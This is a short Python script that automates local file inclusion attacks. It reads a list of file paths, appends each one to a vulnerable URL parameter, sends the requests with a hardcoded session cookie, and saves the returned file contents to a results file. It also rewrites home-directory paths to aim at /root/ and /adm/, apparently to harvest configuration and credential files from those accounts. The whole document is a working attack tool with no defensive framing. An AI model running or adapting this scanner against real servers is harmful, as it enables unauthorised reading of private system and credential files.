import requests
import time 
import argparse

lfi_list = open( "lfi.txt", 'r' )
result_lfi_file = open( 'lfi_res.txt', 'w+' )
		
with lfi_list as read_lfi_list:

	lfi_list_lines_read = read_lfi_list.readlines()
		    
def parce_lfi(link_url):

	for lfi_file in lfi_list_lines_read:

		url = link_url+lfi_file.replace('\n', '')
		headers = {
		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
		    'Accept-Language': 'en-US,en;q=0.5',
		    'Accept-Encoding': 'gzip, deflate, br',
		    'Connection': 'keep-alive',
		    'Cookie': 'PHPSESSID=017d63263e2db5834132f5e6d0170f71',
		    'Upgrade-Insecure-Requests': '1',
		    'Sec-Fetch-Dest': 'document',
		    'Sec-Fetch-Mode': 'navigate',
		    'Sec-Fetch-Site': 'none',
		    'Sec-Fetch-User': '?1'
		}

		request_lfi = requests.get(url, headers=headers)
		
		result_lfi = lfi_file+'\n'+request_lfi.text
		
		print(request_lfi.text)
		
		result_lfi_file.write(result_lfi)

			
		if "~/" in lfi_file:
			lfi_file_root = lfi_file.replace('~/.', '/root/')
			url = link_url+lfi_file_root
			request_lfi = requests.get(url)
			result_lfi_r = lfi_file_root+'\n'+request_lfi.text
			result_lfi_file.write(result_lfi_r)
			
			lfi_file_adm = lfi_file.replace('~/.', '/adm/')
			url = link_url+lfi_file_adm
			request_lfi = requests.get(url)
			result_lfi_a = lfi_file_adm+'\n'+request_lfi.text
			result_lfi_file.write(result_lfi_a)
		print(url)	
	
	

def main():

	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', type=str, help='link lfi, example https://test.com?url=file://')
	
	args = parser.parse_args()
	parce_lfi(args.url)
	

if __name__ == "__main__":
    main()
